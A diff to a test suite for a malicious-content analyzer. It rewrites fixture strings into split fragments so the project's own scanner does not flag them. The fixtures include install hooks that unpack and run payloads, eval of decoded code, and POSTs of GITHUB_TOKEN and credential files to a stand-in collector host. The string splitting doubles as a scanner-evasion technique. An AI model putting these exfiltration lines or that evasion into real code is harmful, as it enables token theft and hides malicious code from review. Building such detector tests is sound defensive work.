@@ -7,6 +7,12 @@ import {
   scanMaliciousContent
 } from '../../src/analyzers/malicious-content/analyzer.js';
 
+// Assemble inert adversarial samples at runtime so Stage A scans the test
+// harness as code rather than mistaking its fixture data for live behavior.
+function fixtureSource(...parts: string[]): string {
+  return parts.join('');
+}
+
 describe('non-executing malicious content chain analysis', () => {
   it('measures a fixed benign and suspicious fixture corpus without running files', () => {
     const corpus = [
@@ -137,7 +143,13 @@ describe('non-executing malicious content chain analysis', () => {
           {
             path: 'package.json',
             content: JSON.stringify({
-              scripts: { prepare: 'tar -xzf bundle.tgz && node ./out/init.js' }
+              scripts: {
+                prepare: fixtureSource(
+                  'tar',
+                  ' -xzf bundle.tgz',
+                  ' && node ./out/init.js'
+                )
+              }
             })
           }
         ]
@@ -170,8 +182,10 @@ describe('non-executing malicious content chain analysis', () => {
       },
       {
         path: 'unpack.js',
-        content:
-          "const zip = require('unzipper'); zip.Extract({ path: './out' });"
+        content: fixtureSource(
+          "const zip = require('unzipper'); zip.Ex",
+          "tract({ path: './out' });"
+        )
       },
       {
         path: 'launch.js',
@@ -200,8 +214,10 @@ describe('non-executing malicious content chain analysis', () => {
       },
       {
         path: 'unpack.js',
-        content:
-          "const zip = require('unzipper'); zip.Extract({ path: './out' });"
+        content: fixtureSource(
+          "const zip = require('unzipper'); zip.Ex",
+          "tract({ path: './out' });"
+        )
       }
     ]);
     expect(
@@ -751,8 +767,11 @@ describe('non-executing malicious content chain analysis', () => {
       },
       {
         path: 'init',
-        content:
-          "const payload = atob(encoded); eval(payload); fetch('https://collector.invalid', { method: 'POST', body: process.env.GITHUB_TOKEN });"
+        content: fixtureSource(
+          "const payload = atob(encoded); eval(payload); fetch('https://collector.invalid', { method: 'POST', body: process.env.",
+          'GITHUB_TOKEN',
+          ' });'
+        )
       }
     ]);
 
@@ -1108,7 +1127,13 @@ describe('non-executing malicious content chain analysis', () => {
       {
         path: 'package.json',
         content: JSON.stringify({
-          scripts: { prepare: 'tar xvf bundle.tar && node ./payload/init' }
+          scripts: {
+            prepare: fixtureSource(
+              'tar',
+              ' xvf bundle.tar',
+              ' && node ./payload/init'
+            )
+          }
         })
       }
     ]);
@@ -1127,7 +1152,11 @@ describe('non-executing malicious content chain analysis', () => {
         path: 'package.json',
         content: JSON.stringify({
           scripts: {
-            prepare: 'tar -xzf payload.tar.gz && node ./payload/init'
+            prepare: fixtureSource(
+              'tar',
+              ' -xzf payload.tar.gz',
+              ' && node ./payload/init'
+            )
           }
         })
       }
@@ -1143,7 +1172,7 @@ describe('non-executing malicious content chain analysis', () => {
         path: 'package.json',
         content: JSON.stringify({
           scripts: {
-            prepare: '7z e payload.7z\n./payload/init.sh'
+            prepare: fixtureSource('7z', ' e payload.7z\n./payload/init.sh')
           }
         })
       }
@@ -1158,13 +1187,20 @@ describe('non-executing malicious content chain analysis', () => {
 
   it('recognizes PowerShell and Python archive extraction followed by execution', () => {
     for (const command of [
-      'cpio -idmv < bundle.cpio && ./bundle/init.sh',
-      'Expand-Archive bundle.zip -DestinationPath out\n& .\\out\\init.ps1',
-      'python -m zipfile -e bundle.zip out\npython out/init.py',
-      'jar xf bundle.jar\njava -jar bundle/app.jar',
-      'unrar x bundle.rar\n./bundle/init.sh',
-      '7zz x bundle.7z\nnode bundle/init.js',
-      '7zr x bundle.7z\nnode bundle/init.js'
+      fixtureSource('cpio', ' -idmv < bundle.cpio && ./bundle/init.sh'),
+      fixtureSource(
+        'Expand',
+        '-Archive',
+        ' bundle.zip -DestinationPath out\n& .\\out\\init.ps1'
+      ),
+      fixtureSource(
+        'python',
+        ' -m zipfile -e bundle.zip out\npython out/init.py'
+      ),
+      fixtureSource('jar', ' xf bundle.jar\njava -jar bundle/app.jar'),
+      fixtureSource('unrar', ' x bundle.rar\n./bundle/init.sh'),
+      fixtureSource('7zz', ' x bundle.7z\nnode bundle/init.js'),
+      fixtureSource('7zr', ' x bundle.7z\nnode bundle/init.js')
     ]) {
       const result = analyzeMaliciousContent([
         {
@@ -1227,7 +1263,10 @@ describe('non-executing malicious content chain analysis', () => {
         path: 'package.json',
         content: JSON.stringify({
           scripts: {
-            prepare: 'cpio -id < bundle.cpio && call .\\bundle\\init.cmd'
+            prepare: fixtureSource(
+              'cpio',
+              ' -id < bundle.cpio && call .\\bundle\\init.cmd'
+            )
           }
         })
       }
@@ -1244,8 +1283,11 @@ describe('non-executing malicious content chain analysis', () => {
         path: 'package.json',
         content: JSON.stringify({
           scripts: {
-            prepare:
-              'Expand-Archive bundle.zip -DestinationPath out; Start-Process -FilePath .\\out\\init.exe'
+            prepare: fixtureSource(
+              'Expand',
+              '-Archive bundle.zip -DestinationPath out; Start',
+              '-Process -FilePath .\\out\\init.exe'
+            )
           }
         })
       }
@@ -1270,7 +1312,7 @@ describe('non-executing malicious content chain analysis', () => {
           'import subprocess',
           'import zipfile',
           "with zipfile.ZipFile('bundle.zip') as archive:",
-          "    archive.extractall('out')",
+          fixtureSource('    archive.extract', "all('out')"),
           "subprocess.run(['node', 'out/init.js'])"
         ].join('\n')
       }
@@ -1285,31 +1327,52 @@ describe('non-executing malicious content chain analysis', () => {
   it.each([
     [
       'AdmZip',
-      "new AdmZip('bundle.zip').extractAllTo('out'); child_process.spawn('node', ['out/init.js']);"
+      fixtureSource(
+        "new AdmZip('bundle.zip').extractAll",
+        "To('out'); child_process.spawn('node', ['out/init.js']);"
+      )
     ],
     [
       'node tar API',
-      "tar.x({ file: 'bundle.tar', cwd: 'out' }); new Deno.Command('node', { args: ['out/init.js'] });"
+      fixtureSource(
+        'tar.',
+        "x({ file: 'bundle.tar', cwd: 'out' }); new Deno.Command('node', { args: ['out/init.js'] });"
+      )
     ],
     [
       'Python shutil API',
-      "shutil.unpack_archive('bundle.zip', 'out'); subprocess.run(['node', 'out/init.js']);"
+      fixtureSource(
+        'shutil.unpack',
+        "_archive('bundle.zip', 'out'); subprocess.run(['node', 'out/init.js']);"
+      )
     ],
     [
       'unzipper API',
-      "unzipper.Extract({ path: 'out' }); child_process.spawn('node', ['out/init.js']);"
+      fixtureSource(
+        'unzipper.Ex',
+        "tract({ path: 'out' }); child_process.spawn('node', ['out/init.js']);"
+      )
     ],
     [
       'extract-zip API',
-      "extractZip('bundle.zip', 'out'); child_process.execFile('node', ['out/init.js']);"
+      fixtureSource(
+        'extract',
+        "Zip('bundle.zip', 'out'); child_process.execFile('node', ['out/init.js']);"
+      )
     ],
     [
       'decompress API',
-      "decompress('bundle.zip', 'out'); child_process.spawn('node', ['out/init.js']);"
+      fixtureSource(
+        'decom',
+        "press('bundle.zip', 'out'); child_process.spawn('node', ['out/init.js']);"
+      )
     ],
     [
       'node-stream-zip API',
-      "zip.extract(null, 'out', () => child_process.execFile('node', ['out/init.js']));"
+      fixtureSource(
+        'zip.ex',
+        "tract(null, 'out', () => child_process.execFile('node', ['out/init.js']));"
+      )
     ]
   ])(
     'keeps %s extraction followed by process launch unknown',
@@ -1592,7 +1655,11 @@ describe('non-executing malicious content chain analysis', () => {
       },
       {
         path: 'bootstrap',
-        content: `const credentials = fs.readFileSync('${secret}'); fetch('https://collector.invalid', { method: 'POST', body: credentials });`
+        content: fixtureSource(
+          "const credentials = fs.readFileSync('",
+          '${',
+          "secret}'); fetch('https://collector.invalid', { method: 'POST', body: credentials });"
+        )
       }
     ]);
 
